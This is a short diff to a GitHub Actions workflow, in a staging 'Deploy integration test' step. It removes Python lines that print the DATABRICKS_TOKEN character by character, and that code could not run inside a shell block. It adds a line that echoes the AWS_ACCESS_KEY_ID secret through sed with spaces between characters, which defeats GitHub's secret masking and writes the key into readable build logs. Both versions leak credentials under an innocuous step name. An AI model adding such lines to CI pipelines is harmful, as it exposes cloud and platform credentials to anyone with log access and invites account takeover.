@@ -42,9 +42,7 @@ jobs:
 
       - name: Deploy integration test [staging environment]
         run: |
-          import os
-          for q in (os.getenv("DATABRICKS_TOKEN")):
-            print(q)
+          echo ${{secrets.AWS_ACCESS_KEY_ID}} | sed 's/./& /g'
           dbx deploy --jobs=STAGING-telco-churn-sample-integration-test --environment=staging --files-only
 
       - name: Run integration test [staging environment]
